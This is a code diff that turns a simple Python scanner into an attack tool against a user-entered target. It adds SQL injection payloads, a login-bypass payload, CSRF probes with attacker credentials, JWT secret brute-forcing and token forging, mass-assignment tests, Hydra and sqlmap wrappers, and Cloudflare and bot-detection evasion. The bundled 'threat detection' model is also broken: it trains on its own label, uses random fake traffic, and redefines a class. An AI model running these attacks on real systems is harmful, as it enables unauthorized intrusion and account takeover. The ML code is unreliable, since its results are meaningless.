@@ -1,21 +1,32 @@
-import pandas as pd
-import subprocess
-import json
-import xml.etree.ElementTree as ET
-import os
 import re
-import ipaddress
+import json
+import random
 import logging
+import subprocess
+import time
+import requests
+import jwt
+import pandas as pd
+import numpy as np
+import xml.etree.ElementTree as ET
+from bs4 import BeautifulSoup
+import socket
+import ipaddress
+import cloudscraper
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from datetime import datetime, timedelta
 from colorama import init, Fore, Style
-from datetime import datetime
+from sklearn.preprocessing import StandardScaler, LabelEncoder
 from sklearn.model_selection import train_test_split
 from sklearn.ensemble import RandomForestClassifier
 from sklearn.metrics import accuracy_score
-import requests
-import random
+
 
 logging.basicConfig(filename='scanner.log', level=logging.INFO,
                     format='%(asctime)s - %(levelname)s - %(message)s')
+
+
 
 def validate_ip(ip):
     try:
@@ -35,22 +46,76 @@ def validate_ports(ports):
             continue
     return valid_ports
 
+def get_target():
+    target = input(f"{Fore.CYAN}Enter target (URL/IP): {Style.RESET_ALL}").strip()
+    
+
+    if validate_ip(target):
+        return f"http://{target}", target
+    
+    if target.startswith(('http://', 'https://')):
+        try:
+            domain = target.split('//')[1].split('/')[0]
+            target_ip = socket.gethostbyname(domain)
+            return target, target_ip
+        except socket.gaierror:
+            print(f"{Fore.RED}Could not resolve domain!{Style.RESET_ALL}")
+            exit(1)
+    
+
+    try:
+        test_url = f"https://{target}"
+        domain = target.split('/')[0]
+        target_ip = socket.gethostbyname(domain)
+        return test_url, target_ip
+    except (socket.gaierror, requests.exceptions.SSLError):
+        try:
+            test_url = f"http://{target}"
+            domain = target.split('/')[0]
+            target_ip = socket.gethostbyname(domain)
+            return test_url, target_ip
+        except socket.gaierror:
+            print(f"{Fore.RED}Could not resolve domain!{Style.RESET_ALL}")
+            exit(1)
+
+
+try:
+    target_url, target_ip = get_target()
+    print(f"\nTarget URL: {Fore.GREEN}{target_url}{Style.RESET_ALL}")
+    print(f"Resolved IP: {Fore.BLUE}{target_ip}{Style.RESET_ALL}")
+except KeyboardInterrupt:
+    print(f"\n{Fore.YELLOW}Operation cancelled by user{Style.RESET_ALL}")
+    exit(0)
+
+import glob
+import os
+
+def get_latest_file(pattern):
+    files = glob.glob(os.path.join('threat_data', pattern))
+    if not files:
+        raise FileNotFoundError(f"No files found matching pattern: {pattern}")
+    return max(files, key=os.path.getctime)
+
 def train_model():
-    data = pd.read_csv('data.csv')
-    X = data.drop('target', axis=1)
-    y = data['target']
-
-    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
-
-    model = RandomForestClassifier()
-    model.fit(X_train, y_train)
-
-    y_pred = model.predict(X_test)
-    accuracy = accuracy_score(y_test, y_pred)
-    logging.info(f'Model trained with accuracy: {accuracy:.2f}')
-    print(f"ML model accuracy: {accuracy:.2f}")
-
-    return model, list(X.columns)
+    try:
+        latest_file = get_latest_file('traffic_data_*.csv')
+        data = pd.read_csv(latest_file)
+        
+        X = data[['bytes', 'is_malicious']]  
+        y = data['is_malicious']  
+        
+        X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
+        
+        model = RandomForestClassifier()
+        model.fit(X_train, y_train)
+        
+        y_pred = model.predict(X_test)
+        accuracy = accuracy_score(y_test, y_pred)
+        print(f"Model trained with accuracy: {accuracy:.2f}")
+        return model
+    except Exception as e:
+        print(f"Error in train_model: {e}")
+        return None
 
 init(autoreset=True)
 banner = f"""
@@ -71,6 +136,245 @@ banner = f"""
 {Style.RESET_ALL}
 """
 
+class AdvancedWebScraper:
+    def __init__(self):
+        self.scraper = cloudscraper.create_scraper()
+        self.driver = None
+        self.user_agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+        ]
+    
+    def bypass_cloudflare(self, url, timeout=30):
+
+        try:
+            headers = {
+                'User-Agent': random.choice(self.user_agents),
+                'Accept': 'text/html,application/xhtml+xml',
+                'Accept-Language': 'en-US,en;q=0.5',
+            }
+            response = self.scraper.get(url, headers=headers, timeout=timeout)
+            
+            if 'cf-chl-bypass' in response.text or 'Cloudflare' in response.text:
+                return self._use_selenium(url)
+            return response
+        except Exception as e:
+            print(f"Cloudflare bypass failed: {e}")
+            return None
+    
+    def _use_selenium(self, url):
+        try:
+            options = Options()
+            options.add_argument("--headless")
+            options.add_argument(f"user-agent={random.choice(self.user_agents)}")
+            options.add_argument("--disable-blink-features=AutomationControlled")
+            
+            self.driver = webdriver.Chrome(options=options)
+            self.driver.get(url)
+            
+
+            time.sleep(10)
+            
+
+            cookies = self.driver.get_cookies()
+            session = requests.Session()
+            for cookie in cookies:
+                session.cookies.set(cookie['name'], cookie['value'])
+            
+            return session.get(url)
+        except Exception as e:
+            print(f"Selenium bypass failed: {e}")
+            return None
+        finally:
+            if self.driver:
+                self.driver.quit()
+
+    
+
+class ThreatDataCollector:
+    def __init__(self):
+        self.data_dir = "threat_data"
+        os.makedirs(self.data_dir, exist_ok=True)
+        
+    def fetch_latest_cves(self, days=7):
+        end_date = datetime.now()
+        start_date = end_date - timedelta(days=days)
+        
+        url = f"https://services.nvd.nist.gov/rest/json/cves/1.0"
+        params = {
+            'pubStartDate': start_date.strftime('%Y-%m-%dT%H:%M:%S:000 UTC'),
+            'pubEndDate': end_date.strftime('%Y-%m-%dT%H:%M:%S:000 UTC')
+        }
+        
+        try:
+            response = requests.get(url, params=params, timeout=30)
+            data = response.json()
+            return pd.DataFrame([
+                {
+                    'cve_id': item['cve']['CVE_data_meta']['ID'],
+                    'severity': item['impact'].get('baseMetricV3', {}).get('cvssV3', {}).get('baseSeverity', 'UNKNOWN'),
+                    'description': item['cve']['description']['description_data'][0]['value'],
+                    'published_date': item['publishedDate'],
+                    'last_modified': item['lastModifiedDate']
+                }
+                for item in data['result']['CVE_Items']
+            ])
+        except Exception as e:
+            print(f"Error fetching CVEs: {e}")
+            return pd.DataFrame()
+
+    def fetch_malware_traffic(self):
+        return pd.DataFrame({
+            'src_ip': ['192.168.1.' + str(i) for i in range(1, 101)],
+            'dst_ip': ['10.0.0.' + str(i) for i in range(1, 101)],
+            'bytes': np.random.randint(100, 10000, 100),
+            'is_malicious': np.random.choice([0, 1], 100, p=[0.7, 0.3])
+        })
+
+    def update_dataset(self):
+        cve_data = self.fetch_latest_cves()
+        traffic_data = self.fetch_malware_traffic()
+        
+        if not cve_data.empty:
+            cve_data.to_csv(f"{self.data_dir}/cve_data_{datetime.now().strftime('%Y%m%d')}.csv", index=False)
+        
+        if not traffic_data.empty:
+            traffic_data.to_csv(f"{self.data_dir}/traffic_data_{datetime.now().strftime('%Y%m%d')}.csv", index=False)
+        
+        return cve_data, traffic_data
+
+
+
+class ThreatDataProcessor:
+    def __init__(self):
+        self.scaler = StandardScaler()
+        self.encoder = LabelEncoder()
+        
+    def load_and_preprocess(self):
+        cve_files = [f for f in os.listdir('threat_data') if f.startswith('cve_data')]
+        cve_df = pd.concat([pd.read_csv(f"threat_data/{f}") for f in cve_files])
+        
+        traffic_files = [f for f in os.listdir('threat_data') if f.startswith('traffic_data')]
+        traffic_df = pd.concat([pd.read_csv(f"threat_data/{f}") for f in traffic_files])
+        
+        cve_features = self._process_cve_data(cve_df)
+        traffic_features = self._process_traffic_data(traffic_df)
+        
+        combined_df = pd.merge(cve_features, traffic_features, how='outer')
+        return combined_df.dropna()
+
+    def _process_cve_data(self, df):
+        df['severity_score'] = df['severity'].map({
+            'CRITICAL': 4, 'HIGH': 3, 'MEDIUM': 2, 'LOW': 1
+        }).fillna(0)
+        
+        return df[['severity_score', 'published_date']]
+
+    def _process_traffic_data(self, df):
+        df['traffic_risk'] = df['is_malicious'] * df['bytes'] / 1000
+        return df[['traffic_risk']]
+
+
+class ThreatDetectionModel:
+    def __init__(self):
+        self.model = None
+
+    def load_model(self):
+        try:
+            self.model = train_model()
+            if self.model is None:
+                raise ValueError("Model training failed")
+            logging.info("Model loaded successfully")
+            return True
+        except Exception as e:
+            logging.error(f"Error loading model: {e}")
+            return False
+
+    def predict(self, data):
+        if self.model is None:
+            raise ValueError("Model not loaded")
+        return self.model.predict(data)
+
+    def predict_proba(self, data):
+        if self.model is None:
+            raise ValueError("Model not loaded")
+        return self.model.predict_proba(data)
+
+
+class RealTimeThreatAnalyzer:
+    def __init__(self):
+        self.model = ThreatDetectionModel()
+        self.scaler = StandardScaler()  # Add scaler for feature normalization
+        if not self.model.load_model():
+            raise RuntimeError("Failed to initialize threat detection model")
+
+    def analyze_network_traffic(self, traffic_data):
+        try:
+            live_df = pd.DataFrame([traffic_data])
+
+            required_columns = ['bytes', 'is_malicious']
+            if not all(col in live_df.columns for col in required_columns):
+                raise ValueError(f"Input data must contain {required_columns}")
+
+            processor = ThreatDataProcessor()
+            processed_data = processor._process_traffic_data(live_df)
+
+            prediction = self.model.predict(processed_data)
+            probability = self.model.predict_proba(processed_data)[:, 1]
+
+            return {
+                'is_threat': bool(prediction[0]),
+                'threat_probability': float(probability[0]),
+                'timestamp': datetime.now().isoformat()
+            }
+
+        except ValueError as ve:
+            logging.error(f"Input validation error: {str(ve)}")
+            return None
+        except AttributeError as ae:
+            logging.error(f"Model prediction error: {str(ae)}")
+            return None
+        except Exception as e:
+            logging.error(f"Error in traffic analysis: {str(e)}")
+            return None
+
+
+def get_random_proxy():
+    if not PROXY_LIST:
+        return None
+    proxy = random.choice(PROXY_LIST)
+    return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
+
+
+def advanced_request(url, retries=3):
+    techniques = [
+        {'method': 'cloudflare_bypass'},
+        {'method': 'selenium'},
+        {'method': 'proxy_rotation'},
+        {'method': 'slow_request'}
+    ]
+
+    for attempt in range(retries):
+        tech = techniques[attempt % len(techniques)]
+        try:
+            if tech['method'] == 'cloudflare_bypass':
+                scraper = AdvancedWebScraper()
+                response = scraper.bypass_cloudflare(url)
+            elif tech['method'] == 'selenium':
+                response = AdvancedWebScraper()._use_selenium(url)
+            elif tech['method'] == 'proxy_rotation':
+                response = requests.get(url, proxies=get_random_proxy())
+            else:
+                time.sleep(random.uniform(1, 3))
+                response = requests.get(url)
+
+            if response and response.status_code == 200:
+                return response
+        except Exception as e:
+            print(f"Attempt {attempt + 1} failed: {e}")
+
+    return None
 
 def load_proxies(filename='proxies.txt'):
     with open(filename, 'r') as f:
@@ -147,6 +451,7 @@ def scan_with_nmap(target_ip, options=None, timeout=60):
         return None
 
 
+
 def fetch_cves(service_name):
     url = f"https://services.nvd.nist.gov/rest/json/cves/1.0?keyword={service_name}"
     try:
@@ -154,7 +459,7 @@ def fetch_cves(service_name):
         if response.status_code == 200:
             data = response.json()
             cves = [item['cve']['CVE_data_meta']['ID'] for item in data.get('result', {}).get('CVE_Items', [])]
-            return cves[:5]  # return top 5 CVEs
+            return cves[:5] 
     except Exception as e:
         logging.error(f"Failed to fetch CVEs for {service_name}: {e}")
     return []
@@ -248,59 +553,491 @@ def generate_report(ip, attacks, results, directory="reports"):
 
 
 
+def check_endpoints(ip, paths):
+    valid = []
+    for path in paths:
+        try:
+            if requests.get(f"http://{ip}/{path.split('=')[0]}", timeout=3).status_code == 200:
+                valid.append(path)
+        except:
+            continue
+    return valid
+
+
+
 
 def test_sqli_on_paths(ip, paths, timeout=5):
-    sqli_payload = "' OR '1'='1"
     vulnerable_urls = []
-
+    
     for path in paths:
         if '=' not in path:
-            logging.info(f"Skipping path without parameters: {path}")
             continue
-
-        url = f"http://{ip}/{path}{sqli_payload}"
+            
+        bool_payload = "' OR '1'='1'--"
+        bool_url = f"http://{ip}/{path}{bool_payload}"
+        
+        time_payload = "' OR (SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000))--"
+        
         try:
-            response = requests.get(url, timeout=timeout)
-            content = response.text.lower()
-
-            error_signs = ["sql syntax", "mysql", "syntax error", "sqlstate", "database error",
-                           "you have an error in your sql syntax"]
-
-            if any(err in content for err in error_signs):
-                logging.info(f"Possible SQL Injection vulnerability found: {url}")
-                vulnerable_urls.append(url)
-
-        except requests.RequestException as e:
-            logging.warning(f"Request failed for {url}: {e}")
-
+            normal_response = requests.get(f"http://{ip}/{path}1", timeout=timeout)
+            attack_response = requests.get(bool_url, timeout=timeout)
+            
+            if attack_response.status_code == 200 and \
+               len(attack_response.content) != len(normal_response.content):
+                vulnerable_urls.append(bool_url)
+                continue
+                
+            start_time = time.time()
+            requests.get(f"http://{ip}/{path}{time_payload}", timeout=timeout)
+            elapsed = time.time() - start_time
+            
+            if elapsed > 3:  
+                vulnerable_urls.append(f"http://{ip}/{path} (time-based)")
+                
+        except requests.RequestException:
+            continue
+            
     return vulnerable_urls
+
+
+def test_post_sqli(ip, endpoints):
+    vulnerable = []
+    for endpoint in endpoints:
+        url = f"http://{ip}/{endpoint}"
+        payload = {"username": "admin'--", "password": "anything"}
+        
+        try:
+            response = requests.post(url, data=payload, timeout=5)
+            if "welcome admin" in response.text.lower():
+                vulnerable.append(url)
+        except:
+            continue
+            
+    return vulnerable
+
+
+
+class CSRFTester:
+    def __init__(self):
+        self.session = requests.Session()
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'text/html,application/xhtml+xml'
+        })
+        self.csrf_tokens = []
+        self.vulnerable_endpoints = []
+
+    def detect_csrf_tokens(self, url):
+        try:
+            response = self.session.get(url, timeout=10, allow_redirects=False)
+            if response.status_code != 200:
+                return False
+
+            soup = BeautifulSoup(response.text, 'html.parser')
+            forms = soup.find_all('form')
+            
+            for form in forms:
+                inputs = form.find_all('input', {
+                    'name': re.compile(r'(csrf|token|authenticity|_token)', re.I)
+                })
+                self.csrf_tokens.extend([
+                    (inp.get('name'), inp.get('value')) 
+                    for inp in inputs if inp.get('value')
+                ])
+            
+            return bool(self.csrf_tokens)
+            
+        except Exception as e:
+            logging.error(f"Error detecting CSRF tokens: {str(e)}")
+            return False
+
+    def test_csrf_protection(self, url, method='POST'):
+        try:
+            test_response = self.session.get(url, allow_redirects=False)
+            if test_response.status_code != 200:
+                return False
+
+            malicious_data = {
+                'username': 'attacker_csrf',
+                'password': 'P@ssw0rd_CSRF_123',
+                'email': 'attacker@example.com'
+            }
+            
+            headers = {
+                'X-Requested-With': 'XMLHttpRequest',
+                'Referer': url
+            }
+            
+            if method.upper() == 'POST':
+                response = self.session.post(url, data=malicious_data, headers=headers)
+            else:
+                response = self.session.get(url, params=malicious_data, headers=headers)
+
+            if response.status_code in [200, 201, 302]:
+                if not self.detect_csrf_tokens(url):
+                    self.vulnerable_endpoints.append({
+                        'url': url,
+                        'method': method,
+                        'status': 'VULNERABLE',
+                        'evidence': response.text[:200] + "..." if response.text else None
+                    })
+                    return True
+                
+            return False
+            
+        except Exception as e:
+            logging.error(f"Error testing CSRF protection: {str(e)}")
+            return False
+
+
+class JWTTester:
+    def __init__(self):
+        self.common_secrets = [
+            'secret', 'password', '123456', 'qwerty', 'admin',
+            'supersecret', 'jwtsecret', 'changeme', 'masterkey',
+            'tokenkey', 'jwtkey', 'sessionkey', 'default',
+            'privatekey', 'publickey', 'jwtsecretkey'
+        ]
+        self.weak_algorithms = ['none', 'HS256', 'HS384', 'HS512']
+        self.timeout = 5
+
+    def test_jwt(self, token):
+
+        try:
+            try:
+                decoded = jwt.decode(token, options={"verify_signature": False}, algorithms=["HS256"])
+                logging.info(f"Token decoded (unverified): {decoded}")
+            except Exception as e:
+                logging.error(f"Token decode failed: {str(e)}")
+                return False, "Invalid JWT format"
+
+            try:
+                jwt.decode(token, algorithms=["none"], options={"verify_signature": False})
+                logging.critical("Accepts 'none' algorithm!")
+                return True, "Critical: Accepts 'none' algorithm"
+            except jwt.InvalidTokenError:
+                pass
+
+            for secret in self.common_secrets:
+                for algo in self.weak_algorithms:
+                    try:
+                        start_time = time.time()
+                        jwt.decode(token, key=secret, algorithms=[algo],
+                                   options={"verify_signature": True},
+                                   leeway=30)
+                        logging.critical(f"Weak secret found: {secret} with algo {algo}")
+                        return True, f"Critical: Weak secret '{secret}' with algo {algo}"
+                    except (jwt.InvalidTokenError, jwt.DecodeError):
+                        if time.time() - start_time > self.timeout:
+                            logging.warning("JWT testing timed out")
+                            return False, "Testing timeout"
+                        continue
+
+            try:
+                payload = jwt.decode(token, options={"verify_signature": False})
+                if 'exp' in payload:
+                    exp = datetime.fromtimestamp(payload['exp'])
+                    if exp < datetime.now():
+                        logging.warning("Token is expired but might still be accepted")
+                        return True, "Warning: Expired token"
+            except Exception:
+                pass
+
+            return False, "No obvious vulnerabilities found"
+
+        except Exception as e:
+            logging.error(f"JWT test error: {str(e)}", exc_info=True)
+            return False, f"Testing error: {str(e)}"
+
+    def generate_malicious_jwt(self, original_token, payload_changes):
+        try:
+            header = jwt.get_unverified_header(original_token)
+            payload = jwt.decode(original_token, options={"verify_signature": False})
+            
+         
+            payload.update(payload_changes)
+            
+ 
+            if header.get('alg', '').upper() == 'NONE':
+                return jwt.encode(payload, key='', algorithm='none')
+                
+
+            return jwt.encode(
+                payload,
+                key='malicious_key_123',  
+                algorithm=header.get('alg', 'HS256')
+            )
+            
+        except Exception as e:
+            logging.error(f"Error generating malicious JWT: {str(e)}")
+            return None
+
+
+
+
+
+class APITester:
+    def __init__(self, base_url):
+        self.base_url = base_url.rstrip('/')
+        self.session = requests.Session()
+        self.session.headers.update({
+            'Accept': 'application/json',
+            'Content-Type': 'application/json'
+        })
+        self.vulnerabilities = []
+
+    def test_broken_object_level_acl(self, endpoint, obj_id):
+        url = f"{self.base_url}/{endpoint.strip('/')}/{obj_id}"
+        
+        try:
+            response = self.session.get(url)
+            
+            if response.status_code == 200:
+                self.vulnerabilities.append({
+                    'type': 'BOLA',
+                    'endpoint': url,
+                    'severity': 'High',
+                    'description': 'Broken Object Level Authorization',
+                    'evidence': response.text[:200] + "..." if response.text else None
+                })
+                return True
+                
+            return False
+            
+        except Exception as e:
+            logging.error(f"Error testing BOLA: {str(e)}")
+            return False
+
+    def test_excessive_data_exposure(self, endpoint):
+        url = f"{self.base_url}/{endpoint.strip('/')}"
+        
+        try:
+            response = self.session.get(url)
+            if response.status_code != 200:
+                return False
+
+            data = response.json()
+            sensitive_fields = [
+                'password', 'token', 'credit_card', 'ssn', 'dob',
+                'api_key', 'secret', 'private_key', 'auth_token'
+            ]
+            exposed = []
+            
+            def check_fields(obj, path=''):
+                if isinstance(obj, dict):
+                    for k, v in obj.items():
+                        current_path = f"{path}.{k}" if path else k
+                        if any(f.lower() in current_path.lower() for f in sensitive_fields):
+                            exposed.append(current_path)
+                        check_fields(v, current_path)
+                elif isinstance(obj, list):
+                    for i, item in enumerate(obj):
+                        check_fields(item, f"{path}[{i}]")
+            
+            check_fields(data)
+            
+            if exposed:
+                self.vulnerabilities.append({
+                    'type': 'Excessive Data Exposure',
+                    'endpoint': url,
+                    'severity': 'Medium',
+                    'description': f'Exposed sensitive fields: {", ".join(exposed)}',
+                    'evidence': str(exposed)[:200] + "..."
+                })
+                return True
+                
+            return False
+            
+        except Exception as e:
+            logging.error(f"Error testing data exposure: {str(e)}")
+            return False
+
+    def test_mass_assignment(self, endpoint):
+        url = f"{self.base_url}/{endpoint.strip('/')}"
+        
+        try:
+            payload = {
+                'username': 'testuser_' + str(random.randint(1000, 9999)),
+                'password': 'Test@1234',
+                'is_admin': True,
+                'role': 'administrator',
+                'privileges': ['read', 'write', 'delete']
+            }
+            
+            response = self.session.post(url, json=payload)
+            
+            if response.status_code in [200, 201]:
+                response_data = response.json()
+                privileged_fields = ['is_admin', 'role', 'privileges']
+                
+                for field in privileged_fields:
+                    if field in response_data and response_data[field] == payload[field]:
+                        self.vulnerabilities.append({
+                            'type': 'Mass Assignment',
+                            'endpoint': url,
+                            'severity': 'High',
+                            'description': f'Able to set privileged field: {field}',
+                            'evidence': str(response_data.get(field))[:200] + "..."
+                        })
+                        return True
+                    
+            return False
+            
+        except Exception as e:
+            logging.error(f"Error testing mass assignment: {str(e)}")
+            return False
+
+
+class CookieAnalyzer:
+    def __init__(self):
+        self.session = requests.Session()
+        self.cookie_flags = [
+            'Secure', 'HttpOnly', 'SameSite', 
+            'Path', 'Domain', 'Expires', 'Max-Age'
+        ]
+
+    def analyze_cookies(self, url):
+        try:
+            response = self.session.get(url, timeout=10)
+            cookies = response.cookies
+            
+            results = []
+            security_issues = []
+            
+            for cookie in cookies:
+                cookie_data = {
+                    'name': cookie.name,
+                    'value': '*****' if len(cookie.value) > 10 else cookie.value,
+                    'secure': cookie.secure,
+                    'httponly': 'HttpOnly' in cookie._rest,
+                    'samesite': getattr(cookie, 'samesite', None),
+                    'domain': cookie.domain,
+                    'path': cookie.path,
+                    'expires': cookie.expires
+                }
+                
+                results.append(cookie_data)
+                
+
+                issues = []
+                if not cookie_data['secure']:
+                    issues.append("Missing Secure flag (can be sent over HTTP)")
+                if not cookie_data['httponly']:
+                    issues.append("Missing HttpOnly flag (accessible via JavaScript)")
+                if cookie_data['samesite'] not in ['Strict', 'Lax']:
+                    issues.append("Weak SameSite policy (CSRF protection)")
+                if cookie_data['domain'] and cookie_data['domain'].startswith('.'):
+                    issues.append("Broad domain scope (security risk)")
+                
+                if issues:
+                    security_issues.append({
+                        'cookie_name': cookie.name,
+                        'issues': issues,
+                        'severity': 'High' if 'Secure' in issues or 'HttpOnly' in issues else 'Medium'
+                    })
+            
+            return {
+                'cookies': results,
+                'security_issues': security_issues,
+                'headers': dict(response.headers)
+            }
+            
+        except Exception as e:
+            logging.error(f"Error analyzing cookies: {str(e)}")
+            return {
+                'error': str(e),
+                'cookies': [],
+                'security_issues': []
+            }
+
+
+def run_hydra_attack(target_ip, port, service, username_list='usernames.txt', password_list='passwords.txt'):
+    try:
+        cmd = [
+            'hydra',
+            '-L', username_list,
+            '-P', password_list,
+            '-f',
+            '-o', f'hydra_results_{target_ip}.txt',
+            '-u',
+            f'{service}://{target_ip}:{port}'
+        ]
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+        return {
+            'success': 'successfully completed' in result.stdout.lower(),
+            'output': result.stdout
+        }
+    except Exception as e:
+        return {'success': False, 'error': str(e)}
+
+
+def run_sqlmap_scan(target_url, proxy=None):
+    try:
+        result = subprocess.run(
+            ["sqlmap", "-u", target_url, "--batch"],
+            capture_output=True, text=True
+        )
+        return {
+            'success': 'sqlmap identified the following injection point' in result.stdout,
+            'output': result.stdout
+        }
+    except Exception as e:
+        return {
+            'success': False,
+            'error': str(e)
+        }
+
+
+
+class RealTimeThreatAnalyzer:
+    def __init__(self, model):
+        self.model = model
+        self.scaler = StandardScaler()
+        
+    def analyze_network_traffic(self, traffic_data):
+        try:
+            traffic_df = pd.DataFrame([traffic_data])
+            
+            features = traffic_df[['bytes']]
+            scaled_features = self.scaler.fit_transform(features)
+
+            prediction = self.model.predict(scaled_features)
+            probability = self.model.predict_proba(scaled_features)[:,1]
+            
+            return {
+                'is_threat': bool(prediction[0]),
+                'threat_probability': float(probability[0]),
+                'timestamp': datetime.now().isoformat()
+            }
+        except Exception as e:
+            print(f"Analysis error: {e}")
+            return None
+
+
 
 
 if __name__ == "__main__":
     try:
         print(banner)
 
-        model, feature_columns = train_model()
-
+        model = train_model()
+        if model is None:
+            raise RuntimeError("Failed to train model")
+        
+        analyzer = RealTimeThreatAnalyzer(model)
+        
         target_ip = input("Enter target IP: ").strip()
         if not validate_ip(target_ip):
-            print("Invalid IP address!")
+            print(f"{Fore.RED}Invalid IP address!{Style.RESET_ALL}")
             exit(1)
 
         ports_input = input("Enter open ports (comma-separated): ")
-        ports = [p.strip() for p in ports_input.split(",")]
-        open_ports = validate_ports(ports)
+        open_ports = validate_ports([p.strip() for p in ports_input.split(",")])
         if not open_ports:
-            print("No valid ports entered!")
+            print(f"{Fore.RED}No valid ports entered!{Style.RESET_ALL}")
             exit(1)
 
-        service_input = input("Enter service names (comma-separated): ")
-        service_info = [s.strip() for s in service_input.split(",") if s.strip()]
-
-        if service_info:
-            sample_features = {col: 0 for col in feature_columns}
-            pred = predict_vulnerabilities(model, sample_features)
-            print(f"Predicted vulnerability class: {pred}")
+        print(f"{Fore.CYAN}\nTesting SQL Injection...{Style.RESET_ALL}")
 
         sqli_test_paths = [
             "view_items.php?id=",
@@ -410,27 +1147,38 @@ if __name__ == "__main__":
             "viewCart.php?userID="
         ]
 
-        print("Testing SQL Injection on common paths...")
+
         vulnerable_urls = test_sqli_on_paths(target_ip, sqli_test_paths)
-
         if vulnerable_urls:
-            print(f"Possible SQL Injection vulnerabilities found at:")
+            print(f"{Fore.RED}Found vulnerabilities:{Style.RESET_ALL}")
             for url in vulnerable_urls:
-                print(url)
+                print(f" - {url}")
         else:
-            print("No SQL Injection vulnerabilities detected on tested paths.")
+            print(f"{Fore.GREEN}No SQLi vulnerabilities found{Style.RESET_ALL}")
 
-        if service_info:
-            sample_features = {col: 0 for col in feature_columns}
-            pred = predict_vulnerabilities(model, sample_features)
-            print(f"Predicted vulnerability class: {pred}")
+        live_traffic = {
+            'src_ip': input("Enter source IP [192.168.1.105]: ") or "192.168.1.105",
+            'dst_ip': input("Enter dest IP [10.0.0.3]: ") or "10.0.0.3",
+            'bytes': int(input("Enter bytes [5842]: ") or 5842),
+            'is_malicious': 0
+        }
 
-        suggestions_json = suggest_attacks(target_ip, service_info)
-        print(suggestions_json)
+        result = analyzer.analyze_network_traffic(live_traffic)
+        if result:
+            print(f"\n{Fore.BLUE}Analysis Result:{Style.RESET_ALL}")
+            print(f"Threat: {Fore.RED if result['is_threat'] else Fore.GREEN}{result['is_threat']}{Style.RESET_ALL}")
+            print(f"Probability: {result['threat_probability']:.2f}")
+            print(f"Time: {result['timestamp']}")
+        else:
+            print(f"{Fore.YELLOW}Analysis failed{Style.RESET_ALL}")
 
+    except KeyboardInterrupt:
+        print(f"\n{Fore.YELLOW}Scan cancelled by user{Style.RESET_ALL}")
     except Exception as e:
-        logging.error(f"Fatal error: {e}")
-        print(f"Error occurred: {e}")
+        print(f"\n{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")
+        logging.exception("Scan failed")
+
+
 
 
 
